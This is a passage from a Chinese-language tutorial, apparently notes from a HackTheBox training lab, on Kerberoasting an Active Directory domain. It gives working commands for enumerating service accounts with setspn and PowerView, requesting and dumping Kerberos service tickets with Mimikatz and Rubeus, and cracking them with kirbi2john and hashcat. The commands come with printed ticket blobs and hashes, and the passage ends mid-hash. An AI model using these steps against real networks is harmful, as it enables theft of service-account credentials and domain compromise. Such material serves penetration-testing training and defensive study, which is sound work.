class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">SQL</span>-<span class="title">CL01</span>-01<span class="title">inlanefreight.local</span>:49351</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqldev</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">DEV</span>-<span class="title">PRE</span>-<span class="title">SQL.inlanefreight.local</span>:1433</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">adfs</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">adfsconnect</span>/<span class="title">azure01.inlanefreight.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Existing</span> <span class="title">SPN</span> <span class="title">found</span>!</span></span><br></pre></td></tr></table></figure><p>为上述 shell 中的帐户请求 TGS 票证并将其加载到内存中。一旦将它们加载到内存中，就可以使用<code>Mimikatz</code>提取它们。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; setspn.exe <span class="literal">-T</span> INLANEFREIGHT.LOCAL <span class="literal">-Q</span> */* | <span class="built_in">Select-String</span> <span class="string">&#x27;^CN&#x27;</span> <span class="literal">-Context</span> <span class="number">0</span>,<span class="number">1</span> | % &#123; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="variable">$_</span>.Context.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure><h3 id="System-IdentityModel"><a href="#System-IdentityModel" class="headerlink" title="System.IdentityModel"></a>System.IdentityModel</h3><p>针对单个帐户请求 TGS 票证并将其加载到内存中。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br><span class="line"></span><br><span class="line">Id                   : uuid<span class="literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-2</span></span><br><span class="line">SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;</span><br><span class="line">ValidFrom            : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">22</span> PM</span><br><span class="line">ValidTo              : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">25</span> AM</span><br><span class="line">ServicePrincipalName : MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span></span><br><span class="line">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span><br></pre></td></tr></table></figure><p>分解上面的命令来看看在做什么（这基本上是<a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Rubeus</a>在使用默认的 Kerberoasting 方法时所使用的）</p><ul><li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2">Add-Type</a> cmdlet用于将 .NET 框架类添加到 PowerShell 会话中，然后可以像任何 .NET 框架对象一样实例化该类</li><li><code>-AssemblyName</code>参数允许指定一个包含感兴趣的类型的程序集</li><li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8">System.IdentityModel</a>是一个命名空间，包含用于构建安全令牌服务的不同类</li><li>然后，将使用<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2">New-Object</a> cmdlet 创建 .NET Framework 对象的实例</li><li>将使用<a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8">System.IdentityModel.Tokens</a>命名空间和<a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">KerberosRequestorSecurityToken</a>类来创建安全令牌，并将 SPN 名称传递给该类，以便在当前登录会话中为目标帐户请求 Kerberos TGS 票证</li></ul><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p><code>setspn.exe</code>为所有设置了 SPN 的账户请求票证。现在票证已加载，可以使用<code>Mimikatz</code>从中提取票证<code>memory</code>。</p><p>如果不指定<code>base64 /out:true</code>命令，Mimikatz 将提取票证并将其写入<code>.kirbi</code>文件。在无法轻松的移动文件的情况下是好的选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Using &#x27;mimikatz.log&#x27; for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz # base64 /out:true</span><br><span class="line">isBase64InterceptInput  is false</span><br><span class="line">isBase64InterceptOutput is true</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::list /export  </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[00000002] - 0x00000017 - rc4_hmac_nt      </span><br><span class="line">   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM</span><br><span class="line">   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL</span><br><span class="line">   Client Name       : htb-student @ INLANEFREIGHT.LOCAL</span><br><span class="line">   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; </span><br><span class="line">====================</span><br><span class="line">Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi</span><br><span class="line">====================</span><br><span class="line">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class="line">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span><br><span class="line">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span><br><span class="line">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span><br><span class="line">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span><br><span class="line">xvUkr+5caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span><br><span class="line">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span><br><span class="line">vyd7g9gYH/9aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span><br><span class="line">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span><br><span class="line">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+5q/xNby7smpBpLToi5No</span><br><span class="line">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span><br><span class="line">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span><br><span class="line">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span><br><span class="line">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span><br><span class="line">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/5aQ5Us+T5qM9pmKn5v1</span><br><span class="line">XHou0shzgunaYPfKPCLgjMNZ8+9vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span><br><span class="line">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span><br><span class="line">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span><br><span class="line">ihGjktgVop70jZRX+2x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span><br><span class="line">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span><br><span class="line">0Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span><br><span class="line">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+8</span><br><span class="line">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span><br><span class="line">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+1FN56h</span><br><span class="line">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span><br><span class="line">32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span><br><span class="line">5oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span><br><span class="line">+jWFIa2EXm0H/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span><br><span class="line">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span><br><span class="line">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span><br><span class="line">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span><br><span class="line">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span><br><span class="line">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span><br><span class="line">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>去除换行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </span><br><span class="line"></span><br><span class="line">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</span><br></pre></td></tr></table></figure><p>使用<code>base64</code>解码并转换回<code>.kirbi</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat encoded_file | base64 -d &gt; sqldev.kirbi</span><br></pre></td></tr></table></figure><p>提取 Kerberos 票证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kirbi2john.py sqldev.kirbi</span><br></pre></td></tr></table></figure><p>破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h2 id="Automated-Tool-Based-Route"><a href="#Automated-Tool-Based-Route" class="headerlink" title="Automated &#x2F; Tool Based Route"></a>Automated &#x2F; Tool Based Route</h2><h3 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h3><h4 id="enum-3"><a href="#enum-3" class="headerlink" title="enum"></a>enum</h4><p>枚举 samaccountname</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">adfs</span><br><span class="line">backupagent</span><br><span class="line">krbtgt</span><br><span class="line">sqldev</span><br><span class="line">sqlprod</span><br><span class="line">sqlqa</span><br><span class="line">solarwindsmonitor</span><br></pre></td></tr></table></figure><h4 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h4><p>将所有票证导出到 CSV 文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-SPN</span> | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat | <span class="built_in">Export-Csv</span> .\ilfreight_tgs.csv <span class="literal">-NoTypeInformation</span></span><br></pre></td></tr></table></figure><p>针对特定用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> sqldev | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat</span><br></pre></td></tr></table></figure><h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><p>GhostPack 中的<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>更快、更轻松地执行 Kerberoasting。</p><ul><li>执行 Kerberoasting 并将哈希输出到文件</li><li>使用备用凭证</li><li>执行 Kerberoasting 与传递票证攻击相结合</li><li>执行 “opsec” Kerberoasting 以过滤掉启用 AES 的账户</li><li>请求在特定日期范围内设置的账户密码的票证</li><li>限制请求的票数</li><li>执行 AES Kerberoast 攻击</li></ul><p><code>/stats</code> 显示服务主体（SPNs）相关的统计信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /stats</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] Listing statistics about target users, no ticket requests being performed.</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"> | Supported Encryption <span class="built_in">Type</span>                        | Count |</span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"> | RC4_HMAC_DEFAULT                                 | <span class="number">7</span>     |</span><br><span class="line"> | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | <span class="number">2</span>     |</span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"> <span class="literal">----------------------------------</span></span><br><span class="line"> | Password Last <span class="built_in">Set</span> Year | Count |</span><br><span class="line"> <span class="literal">----------------------------------</span></span><br><span class="line"> | <span class="number">2022</span>                   | <span class="number">9</span>     |</span><br><span class="line"> <span class="literal">----------------------------------</span></span><br></pre></td></tr></table></figure><p>筛选，<code>/nowrap</code> 不换行，<code>admincount=1</code> 可能的高价值目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /ldapfilter:<span class="string">&#x27;admincount=1&#x27;</span> /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : backupagent</span><br><span class="line">[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local</span><br><span class="line">[*] PwdLastSet             : <span class="number">2</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">2</span>:<span class="number">15</span>:<span class="number">40</span> PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*backupagent<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$backupjob</span>/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*<span class="variable">$750F377DEFA85A67EA0FE51B0B28F83D</span><span class="variable">$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048